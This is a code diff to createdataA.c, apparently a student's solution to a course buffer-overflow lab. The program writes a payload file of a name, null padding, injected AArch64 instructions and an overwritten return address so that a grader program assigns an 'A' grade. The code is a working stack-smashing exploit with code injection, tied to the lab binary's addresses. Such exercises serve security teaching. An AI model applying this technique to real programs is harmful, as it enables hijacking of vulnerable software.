@@ -1,39 +1,44 @@
 /*
- * Produces dataA file that contains student name, null byte, 
- * and padding to perform stack smashing. 
+ * createdataA.c
+ * Produces a file called dataA with the student name, 
+ * a null terminator, padding to overrun the stack, and 
+ * injected instructions (via mini-assembler functions) 
+ * that will modify the saved return address and grade variable
+ * to cause the grader to assign an 'A' grade. 
  */
-
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
 #include "miniassembler.h"
 
 /*
- * main function writes to "dataA" file to perform stack smashing,
- * causing the grader program to assign the A grade. 
+ * This main function takes no command-line arguments and does not 
+ * read from stdin. It writes a sequence of bytes (student name, 
+ * null-padding, and a return address) to the "dataA" file. 
+ * These bytes use buffer overrun in the grader program
+ * to modify the saved return address and grade variable. 
+ * On success, main writes nothing to stdout.
+ * On failure, main prints an error message to stderr and returns 1.
  */
 int main() {
     FILE *psFile; 
     unsigned int MOV, STRB, ADR, B; 
     int i; 
 
-    /* return address is name[32] */
+    /* 0x420078 is the return address, which is name[32] */
     const unsigned int returnAddress = 0x420078;
 
     /* write name and null terminator to file. 
-    grader program will ... */ 
+    return error code if opening fails. */ 
     psFile = fopen("dataA", "wb");
     if (psFile == NULL) {
         perror("Error opening file"); 
-        return 1;  /* Return error code if file opening fails */
+        return 1; 
     }
-
     fprintf(psFile, "%s", "Shin Qian"); 
 
-    /* add padding so that buffer overflow can be performed 
-    48 - 9 (length of name)= 39. 
-    Also have to leave 16 bytes for 4 lines of code.
-    39 - 16 = 23. */ 
+    /* add padding so that buffer overflow can be performed. 
+    48 - 9 (length of name) - 16 (space for the 4 lines of code)= 23 */ 
     for (i = 0; i < 23; i++) {
         fputc(0x00, psFile);
     }
@@ -50,7 +55,7 @@ int main() {
     fwrite(&ADR, sizeof(unsigned int), 1, psFile);
 
     /* STRB W0, X1 
-    STR A in register W0 into the address pointed by X1
+    STR A in register W0 into the address pointed by X1, 
     return back to normal program flow after setting grade to A */
     STRB = MiniAssembler_strb(0, 1);
     fwrite(&STRB, sizeof(unsigned int), 1, psFile);
@@ -61,8 +66,10 @@ int main() {
     B = MiniAssembler_b(0x40089c, 0x420084);
     fwrite(&B, sizeof(unsigned int), 1, psFile);
 
+    /* overwrite return address */
     fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);
 
+    /* close file and return 0 */
     fclose(psFile);
     return 0;
 
